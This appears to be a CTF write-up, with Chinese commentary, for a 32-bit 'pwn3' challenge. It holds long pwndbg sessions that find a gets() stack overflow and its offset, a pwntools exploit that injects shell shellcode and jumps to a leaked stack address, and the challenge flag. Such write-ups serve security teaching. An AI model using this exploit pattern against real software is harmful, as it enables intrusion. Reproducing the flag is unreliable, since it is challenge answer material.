────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x565555c3 <echo+38>    call   56555410h                     <printf@plt>
        format: 0x565556b0 ◂— 'Take this, you might need it on your journey %p!\n'
        vararg: 0xffffd49e ◂— 0x80000

   0x565555c8 <echo+43>    add    esp, 10h
   0x565555cb <echo+46>    sub    esp, 0ch
   0x565555ce <echo+49>    lea    eax, [ebp - 12ah]
   0x565555d4 <echo+55>    push   eax
   0x565555d5 <echo+56>    call   56555420h                     <gets@plt>

   0x565555da <echo+61>    add    esp, 10h
   0x565555dd <echo+64>    nop
   0x565555de <echo+65>    mov    ebx, dword ptr [ebp - 4]
   0x565555e1 <echo+68>    leave
   0x565555e2 <echo+69>    ret
────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd480 —▸ 0x565556b0 ◂— push esp /* 'Take this, you might need it on your journey %p!\n' */
01:0004│-144 0xffffd484 —▸ 0xffffd49e ◂— 0x80000
02:0008│-140 0xffffd488 ◂— 0xffffffff
03:000c│-13c 0xffffd48c —▸ 0x565555ac (echo+15) ◂— add ebx, 1a20h
04:0010│-138 0xffffd490 ◂— 0x100
05:0014│-134 0xffffd494 ◂— 0x0
06:0018│-130 0xffffd498 ◂— 0x40 /* '@' */
07:001c│-12c 0xffffd49c ◂— 0x8000
──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────
 ► 0 0x565555c3 echo+38
   1 0x5655561a main+55
   2 0xf7d84bd7
   3 0xf7d84c9d __libc_start_main+141
   4 0x56555491 _start+49
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/s $ebp-0x12a
0xffffd49e:	""
pwndbg> x/s $ebx-0x191c
0x565556b0:	"Take this, you might need it on your journey %p!\n"
pwndbg> cyclic 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
pwndbg> c
Continuing.
Take this, you might need it on your journey 0xffffd49e!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

Program received signal SIGSEGV, Segmentation fault.
0x56555622 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────
*EAX  0x0
*EBX  0x61796361 ('acya')
*ECX  0xf7f948ac ◂— 0x0
*EDX  0x0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
 ESI  0x56555630 (__libc_csu_init) ◂— push ebp
*EBP  0xff006361
*ESP  0xff006359
*EIP  0x56555622 (main+63) ◂— pop ecx
────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x56555622 <main+63>                    pop    ecx
   0x56555623 <main+64>                    pop    ebx
   0x56555624 <main+65>                    pop    ebp
   0x56555625 <main+66>                    lea    esp, [ecx - 4]
   0x56555628 <main+69>                    ret

   0x56555629 <__x86.get_pc_thunk.ax>      mov    eax, dword ptr [esp]
   0x5655562c <__x86.get_pc_thunk.ax+3>    ret

   0x5655562d <__x86.get_pc_thunk.ax+4>    nop
   0x5655562f <__x86.get_pc_thunk.ax+6>    nop
   0x56555630 <__libc_csu_init>            push   ebp
   0x56555631 <__libc_csu_init+1>          push   edi
────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────
<Could not read memory at 0xff006359>
──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────
 ► 0 0x56555622 main+63
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l acya
Finding cyclic pattern of 4 bytes: b'acya' (hex: 0x61637961)
Found at offset 294
```

这里发现一个新的计算偏移量方法：

```plain-text
pwndbg> b *echo+56
Breakpoint 1 at 0x5d5
pwndbg> b *echo+61
Breakpoint 2 at 0x5da
pwndbg> r
Starting program: /home/cub3y0nd/Projects/CTF/pwn3
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Take this, you might need it on your journey 0xffffd49e!

Breakpoint 1, 0x565555d5 in echo ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
*EAX  0xffffd49e ◂— 0x80000
*EBX  0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
 ECX  0x0
 EDX  0x0
*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
*ESI  0x56555630 (__libc_csu_init) ◂— push ebp
*EBP  0xffffd5c8 —▸ 0xffffd5d8 ◂— 0x0
*ESP  0xffffd480 —▸ 0xffffd49e ◂— 0x80000
*EIP  0x565555d5 (echo+56) —▸ 0xfffe46e8 ◂— 0x0
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
 ► 0x565555d5 <echo+56>    call   56555420h                     <gets@plt>
        arg[0]: 0xffffd49e ◂— 0x80000
        arg[1]: 0xffffd49e ◂— 0x80000
        arg[2]: 0xffffffff
        arg[3]: 0x565555ac (echo+15) ◂— add ebx, 1a20h

   0x565555da <echo+61>    add    esp, 10h
   0x565555dd <echo+64>    nop
   0x565555de <echo+65>    mov    ebx, dword ptr [ebp - 4]
   0x565555e1 <echo+68>    leave
   0x565555e2 <echo+69>    ret

   0x565555e3 <main>       lea    ecx, [esp + 4]
   0x565555e7 <main+4>     and    esp, 0fffffff0h
   0x565555ea <main+7>     push   dword ptr [ecx - 4]
   0x565555ed <main+10>    push   ebp
   0x565555ee <main+11>    mov    ebp, esp
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ esp   0xffffd480 —▸ 0xffffd49e ◂— 0x80000
01:0004│-144   0xffffd484 —▸ 0xffffd49e ◂— 0x80000
02:0008│-140   0xffffd488 ◂— 0xffffffff
03:000c│-13c   0xffffd48c —▸ 0x565555ac (echo+15) ◂— add ebx, 1a20h
04:0010│-138   0xffffd490 ◂— 0x100
05:0014│-134   0xffffd494 ◂— 0x0
06:0018│-130   0xffffd498 ◂— 0x40 /* '@' */
07:001c│ eax-2 0xffffd49c ◂— 0x8000
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0 0x565555d5 echo+56
   1 0x5655561a main+55
   2 0xf7d84bd7
   3 0xf7d84c9d __libc_start_main+141
   4 0x56555491 _start+49
──────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
1234567

Breakpoint 2, 0x565555da in echo ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
 EAX  0xffffd49e ◂— '1234567'
 EBX  0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
*ECX  0xf7f948ac ◂— 0x0
 EDX  0x0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
 ESI  0x56555630 (__libc_csu_init) ◂— push ebp
 EBP  0xffffd5c8 —▸ 0xffffd5d8 ◂— 0x0
 ESP  0xffffd480 —▸ 0xffffd49e ◂— '1234567'
*EIP  0x565555da (echo+61) ◂— add esp, 10h
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
   0x565555d5 <echo+56>    call   56555420h                     <gets@plt>

 ► 0x565555da <echo+61>    add    esp, 10h
   0x565555dd <echo+64>    nop
   0x565555de <echo+65>    mov    ebx, dword ptr [ebp - 4]
   0x565555e1 <echo+68>    leave
   0x565555e2 <echo+69>    ret
    ↓
   0x5655561a <main+55>    mov    eax, 0
   0x5655561f <main+60>    lea    esp, [ebp - 8]
   0x56555622 <main+63>    pop    ecx
   0x56555623 <main+64>    pop    ebx
   0x56555624 <main+65>    pop    ebp
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ esp   0xffffd480 —▸ 0xffffd49e ◂— '1234567'
01:0004│-144   0xffffd484 —▸ 0xffffd49e ◂— '1234567'
02:0008│-140   0xffffd488 ◂— 0xffffffff
03:000c│-13c   0xffffd48c —▸ 0x565555ac (echo+15) ◂— add ebx, 1a20h
04:0010│-138   0xffffd490 ◂— 0x100
05:0014│-134   0xffffd494 ◂— 0x0
06:0018│-130   0xffffd498 ◂— 0x40 /* '@' */
07:001c│ eax-2 0xffffd49c ◂— 0x32318000
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0 0x565555da echo+61
   1 0x5655561a main+55
   2 0xf7d84bd7
   3 0xf7d84c9d __libc_start_main+141
   4 0x56555491 _start+49
──────────────────────────────────────────────────────────────────────────────────
pwndbg> search 1234567
Searching for value: '1234567'
[heap]          0x565581a0 '1234567\n'
libc.so.6       0xf7f17011 0x34333231 ('1234')
libc.so.6       0xf7f2585e '123456789:;<=>?'
libc.so.6       0xf7f349e3 '123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
libc.so.6       0xf7f34a41 '123456789abcdefghijklmnopqrstuvwxyz'
libc.so.6       0xf7f34a81 '123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
libc.so.6       0xf7f34af5 '123456789'
libc.so.6       0xf7f38af1 '123456789abcdef'
ld-linux.so.2   0xf7ff1ebd '123456789abcdef'
[stack]         0xffffd49e '1234567'
pwndbg> i frame
Stack level 0, frame at 0xffffd5d0:
 eip = 0x565555da in echo; saved eip = 0x5655561a
 called by frame at 0xffffd5f0
 Arglist at 0xffffd5c8, args:
 Locals at 0xffffd5c8, Previous frame's sp is 0xffffd5d0
 Saved registers:
  ebx at 0xffffd5c4, ebp at 0xffffd5c8, eip at 0xffffd5cc
pwndbg> hex(0xffffd5cc-0xffffd49e)
+0000 0x00012e
```

最终偏移量是 `0x12e` 而不是 `0x126` 的原因是中间还隔着两个四字节寄存器 `ebx` 和 `ebp`。

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='i386', log_level='debug', terminal='kitty')

target = process('./pwn3')

recvline    = lambda : target.recvline()
recvuntil   = lambda str : target.recvuntil(str)
sendline    = lambda str : target.sendline(str)
interactive = lambda : target.interactive()

recvuntil(b'journey ')

leak_addr = p32(int(recvuntil(b'!').strip(b'!\n'), 16))

shellcode = asm(shellcraft.sh())
payload = shellcode + b'A' * (0x12e - len(shellcode)) + leak_addr

sendline(payload)
interactive()
```

### Flag

Flag: `gigem{r3m073_fl46_3x3cu710n}`

